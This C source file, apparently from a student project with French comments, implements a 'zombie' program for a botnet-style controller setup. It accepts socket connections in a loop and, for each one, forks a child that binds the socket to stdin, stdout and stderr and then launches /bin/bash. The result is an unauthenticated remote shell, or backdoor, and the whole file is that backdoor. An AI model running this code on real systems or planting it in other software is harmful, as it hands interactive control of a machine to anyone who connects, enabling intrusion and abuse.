#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>
#include <string.h>

#include "utils_v2.h"
#include "info.h"
#include "reseau.h"

volatile sig_atomic_t end = 0;

void endHandler(int sig)
{
  end = 1;
}

void zombieFils(void* sockfdController){
    int* sockfd = sockfdController;

    dup2(*sockfd, STDOUT_FILENO);
    dup2(*sockfd, STDERR_FILENO);
    dup2(*sockfd,STDIN_FILENO);

    sexecl("/bin/bash", "bash", NULL);
}

int main(int argc, char *argv[]){
    ssigaction(SIGINT, endHandler);

    int sockfd = initSocketZombie();

    // on considere qu'il n'y a qu'un seul controller ici
    int sockfdController;
    
    while(!end){
        sockfdController = saccept(sockfd);

        fork_and_run1(zombieFils, &sockfdController);
    }
    sclose(sockfdController);
    return 0;
    
}